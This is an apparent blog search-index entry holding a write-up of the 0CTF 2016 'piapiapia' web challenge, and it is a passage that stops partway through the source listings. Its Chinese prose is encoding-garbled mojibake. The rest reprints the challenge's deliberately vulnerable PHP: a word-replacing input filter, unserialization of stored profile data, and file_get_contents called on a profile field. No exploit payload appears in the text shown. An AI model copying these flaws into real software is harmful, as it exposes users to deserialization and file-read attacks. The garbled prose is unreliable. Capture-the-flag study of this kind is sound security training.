<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0CTF 2016 piapiapia</title>
    <url>/2022/04/18/0CTF%202016%20piapiapia/</url>
    <content><![CDATA[<p>é¶æœºåœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">piapiapia</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1 é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418160915.png" /></p>
<p>æœ€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯SQLæ³¨å…¥ï¼Œç–¯ç‹‚å¾—æµ‹è¯•ï¼Œç»“æœä¸€æ— æ‰€è·ï¼ˆğŸ¤¡ï¼‰ï¼Œå®åœ¨æ²¡ç»“æœå°±å°è¯•è·¯å¾„æ‰«æï¼Œç»“æœå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶<code>www.zip</code>ï¼Œè®¿é—®å°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åä¸»è¦æ˜¯6ä¸ªphpæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3.register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Register</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">REGISTER</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 4.profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 5.update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">update</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Please</span> <span class="title">Update</span> <span class="title">Your</span> <span class="title">Profile</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Email</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">email</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Nickname</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">nickname</span>&quot; <span 